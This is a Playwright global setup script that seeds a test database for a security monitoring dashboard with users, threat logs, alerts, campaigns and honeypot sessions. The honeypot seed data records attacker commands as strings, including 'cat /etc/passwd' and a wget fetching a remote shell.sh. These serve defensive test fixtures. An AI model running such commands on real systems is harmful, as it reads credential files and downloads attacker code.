import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { createRequire } from 'module';
import { validateTestDatabaseName } from './dbGuard.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const require = createRequire(import.meta.url);

const envTestPath = path.resolve(__dirname, '../../backend/.env.test');
if (fs.existsSync(envTestPath)) {
  const envContent = fs.readFileSync(envTestPath, 'utf8');
  for (const line of envContent.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eqIdx = trimmed.indexOf('=');
    if (eqIdx !== -1) {
      const key = trimmed.slice(0, eqIdx).trim();
      const val = trimmed.slice(eqIdx + 1).trim();
      if (!process.env[key]) {
        process.env[key] = val;
      }
    }
  }
}

const mongoose = require('../../backend/node_modules/mongoose');
const User = require('../../backend/models/User');
const ThreatLog = require('../../backend/models/ThreatLog');
const HoneypotSession = require('../../backend/models/HoneypotSession');
const Alert = require('../../backend/models/Alert');
const Campaign = require('../../backend/models/Campaign');
const BlockedIP = require('../../backend/models/BlockedIP');
const ContainmentAction = require('../../backend/models/ContainmentAction');
const AuthSession = require('../../backend/models/AuthSession');

export const SEEDED_USERS = {
  admin: {
    name: 'Admin Test',
    email: 'admin@sentinel.test',
    password: 'AdminPassword123!',
    role: 'admin',
    status: 'active',
    mustChangePassword: false,
    department: 'SOC',
  },
  analyst: {
    name: 'Analyst Test',
    email: 'analyst@sentinel.test',
    password: 'AnalystPassword123!',
    role: 'analyst',
    status: 'active',
    mustChangePassword: false,
    department: 'SOC',
  },
  viewer: {
    name: 'Viewer Test',
    email: 'viewer@sentinel.test',
    password: 'ViewerPassword123!',
    role: 'viewer',
    status: 'active',
    mustChangePassword: false,
    department: 'SOC',
  },
  mustChange: {
    name: 'Restricted Operator',
    email: 'restricted@sentinel.test',
    password: 'TempPassword123!',
    role: 'analyst',
    status: 'active',
    mustChangePassword: true,
    department: 'SOC',
  },
};

export { validateTestDatabaseName };

export default async function globalSetup() {
  const mongoUri = process.env.MONGO_URI || 'mongodb://localhost:27017/sentinelai_test';
  const dbName = validateTestDatabaseName(mongoUri);

  console.log(`\n[Playwright Global Setup] Connecting to test DB: ${mongoUri}`);
  await mongoose.connect(mongoUri, { serverSelectionTimeoutMS: 5000 });

  console.log('[Playwright Global Setup] Clearing test collections...');
  await Promise.all([
    User.deleteMany({}),
    ThreatLog.deleteMany({}),
    HoneypotSession.deleteMany({}),
    Alert.deleteMany({}),
    Campaign.deleteMany({}),
    BlockedIP.deleteMany({}),
    ContainmentAction.deleteMany({}),
    AuthSession.deleteMany({}),
  ]);

  console.log('[Playwright Global Setup] Seeding test users...');
  for (const userConfig of Object.values(SEEDED_USERS)) {
    // UserSchema pre-save hashes the password
    await User.create(userConfig);
  }

  console.log('[Playwright Global Setup] Seeding test threats, honeypot sessions, alerts, and campaigns...');
  const sampleThreats = [
    {
      sourceIP: '185.220.101.47',
      targetService: 'AUTH-SRV-01',
      attackType: 'SSH Brute Force',
      severity: 'CRITICAL',
      aiScore: 0.94,
      confidence: 0.96,
      status: 'DETECTED',
      threatIntel: { status: 'SUCCESS', abuseConfidenceScore: 92, totalReports: 34, isp: 'Tor Exit Node' },
      createdAt: new Date(Date.now() - 1000 * 60 * 15),
    },
    {
      sourceIP: '45.95.147.22',
      targetService: 'WEB-SRV-03',
      attackType: 'SQL Injection',
      severity: 'HIGH',
      aiScore: 0.82,
      confidence: 0.85,
      status: 'INVESTIGATING',
      triageNotes: 'Known SQL injection payload targeting auth gateway.',
      threatIntel: { status: 'SUCCESS', abuseConfidenceScore: 78, totalReports: 12, isp: 'Cloud Hosting' },
      createdAt: new Date(Date.now() - 1000 * 60 * 45),
    },
    {
      sourceIP: '194.165.16.78',
      targetService: 'DB-PROD-01',
      attackType: 'DDoS',
      severity: 'HIGH',
      aiScore: 0.79,
      confidence: 0.81,
      status: 'BLOCKED',
      createdAt: new Date(Date.now() - 1000 * 60 * 90),
    },
    {
      sourceIP: '212.102.39.212',
      targetService: 'GATEWAY-01',
      attackType: 'Port Scan',
      severity: 'MEDIUM',
      aiScore: 0.62,
      confidence: 0.68,
      status: 'DETECTED',
      createdAt: new Date(Date.now() - 1000 * 60 * 120),
    },
    {
      sourceIP: '77.247.110.50',
      targetService: 'ENDPOINT-14',
      attackType: 'RCE Attempt',
      severity: 'CRITICAL',
      aiScore: 0.96,
      confidence: 0.98,
      status: 'DETECTED',
      createdAt: new Date(Date.now() - 1000 * 60 * 150),
    },
  ];

  const createdThreats = await ThreatLog.insertMany(sampleThreats);

  const sampleSessions = [
    {
      sessionId: 'cowrie-sess-101',
      sourceIP: '185.220.101.47',
      honeypotNode: 'SSH-COWRIE-01',
      protocol: 'SSH',
      durationSeconds: 145,
      commands: [
        { command: 'uname -a', timestamp: new Date(Date.now() - 1000 * 120), success: true },
        { command: 'cat /etc/passwd', timestamp: new Date(Date.now() - 1000 * 100), success: true },
        { command: 'wget http://45.95.147.22/shell.sh', timestamp: new Date(Date.now() - 1000 * 60), success: false },
      ],
      createdAt: new Date(Date.now() - 1000 * 60 * 30),
    },
    {
      sessionId: 'cowrie-sess-102',
      sourceIP: '45.95.147.22',
      honeypotNode: 'HTTP-LURE-02',
      protocol: 'HTTP',
      durationSeconds: 65,
      commands: [
        { command: 'GET /admin/config.php', timestamp: new Date(Date.now() - 1000 * 50), success: false },
      ],
      createdAt: new Date(Date.now() - 1000 * 60 * 60),
    },
  ];

  const createdSessions = await HoneypotSession.insertMany(sampleSessions);

  const sampleAlerts = [
    {
      title: 'CRITICAL: Host SSH Brute Force Detected',
      message: 'Source 185.220.101.47 exceeded critical authentication velocity thresholds.',
      severity: 'CRITICAL',
      type: 'THREAT_DETECTED',
      sourceRef: { refModel: 'ThreatLog', refId: createdThreats[0]._id },
      isRead: false,
      createdAt: new Date(Date.now() - 1000 * 60 * 10),
    },
    {
      title: 'HIGH: SQL Injection Attempt on Gateway',
      message: 'Automated inspection detected unauthorized UNION SELECT injection pattern.',
      severity: 'HIGH',
      type: 'THREAT_DETECTED',
      sourceRef: { refModel: 'ThreatLog', refId: createdThreats[1]._id },
      isRead: false,
      createdAt: new Date(Date.now() - 1000 * 60 * 35),
    },
  ];

  await Alert.insertMany(sampleAlerts);

  const sampleCampaigns = [
    {
      campaignId: 'CAMP-2026-ALPHA',
      sessions: [createdSessions[0]._id],
      sourceIPs: ['185.220.101.47', '45.95.147.22'],
      threatLevel: 'HIGH',
      maxDeceptionScore: 0.88,
      maxAiThreatScore: 0.94,
      firstSeen: new Date(Date.now() - 1000 * 3600 * 24),
      lastSeen: new Date(),
    },
  ];

  await Campaign.insertMany(sampleCampaigns);

  await BlockedIP.create({
    ip: '198.51.100.1',
    reason: 'Manual test seed containment block',
    blockedAt: new Date(),
  });

  console.log('[Playwright Global Setup] Test data seeded successfully.');
  await mongoose.disconnect();
}
